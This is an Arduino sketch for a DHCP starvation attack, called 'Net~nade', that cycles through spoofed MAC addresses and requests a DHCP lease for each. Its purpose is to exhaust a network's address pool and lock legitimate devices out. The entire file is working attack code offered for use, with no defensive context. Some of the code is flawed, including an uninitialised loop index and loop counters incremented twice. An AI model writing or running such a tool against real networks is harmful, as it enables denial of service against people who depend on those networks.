/*** 
 *    Net~nade: The hand held DHCP grenade (exhaustion attack)
 *  Written by: Moloch
 */
#include <Ethernet.h>
#include <EthernetDHCP.h>

/* Function Prototypes */
void requestIp(byte);
void displayMac(byte);
const char* addressToString(const uint8_t* ip);

/* Setup */
void setup()
{
  Serial.begin(9600);
}

/* Main Loop */
void loop()
{
  byte mac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x01};
  for(int hexFour = 0; hexFour < 256; ++hexFour)
  {
    for(int hexFive = 0; hexFive < 256; ++hexFive)
    {
      requestIp(mac);
      mac[5]++;
      hexFive++;
      EthernetDHCP.maintain();
    }
    mac[4]++;      // Incriment 4th hex value
    mac[5] = 0x01; // Reset 5th hex value
    hexFour++;     // Incriment count
  }
}

void requestIp(byte mac[])
{
  Serial.print("[*] Attempting to obtain DHCP lease...");
  EthernetDHCP.begin(mac);
  const byte* ip = EthernetDHCP.ipAddress();
  const byte* gateway = EthernetDHCP.gatewayIpAddress();
  Serial.println("got it!");

  Serial.print("[+] From ");
  Serial.print(addressToString(gateway));
  Serial.print(" got ");
  Serial.print(addressToString(ip));
  Serial.print(" with ");
  displayMac(mac);
  Serial.print("");
  Serial.print("\n");
}

void displayMac(byte mac[])
{
  for(int index; index <= 5; ++index)
  {
    Serial.print(mac[index], HEX);
    if(index < 5)
    {
      Serial.print(":");
    }
  }
}

const char* addressToString(const uint8_t* ip)
{
  static char buf[16];
  sprintf(buf, "%d.%d.%d.%d\0", ip[0], ip[1], ip[2], ip[3]);
  return buf;
}
